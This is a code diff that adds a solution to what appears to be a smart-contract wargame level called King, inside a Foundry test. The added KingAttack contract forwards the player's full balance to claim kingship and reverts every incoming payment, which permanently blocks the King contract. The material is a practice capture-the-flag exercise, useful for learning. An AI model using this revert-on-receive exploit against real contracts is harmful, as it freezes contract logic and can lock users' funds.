@@ -17,5 +17,20 @@ contract KingLevel is SetUpLevelTest {
         king = King(payable(instance));
 
         /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player);
+        KingAttack kingAttack = new KingAttack();
+        kingAttack.callValue{value: player.balance}(address(king));
+        vm.stopPrank();
+    }
+}
+
+contract KingAttack {
+    function callValue(address _target) public payable {
+        (bool success, ) = address(_target).call{value: msg.value}("");
+        assert(success);
+    }
+
+    receive() external payable {
+        revert();
     }
 }
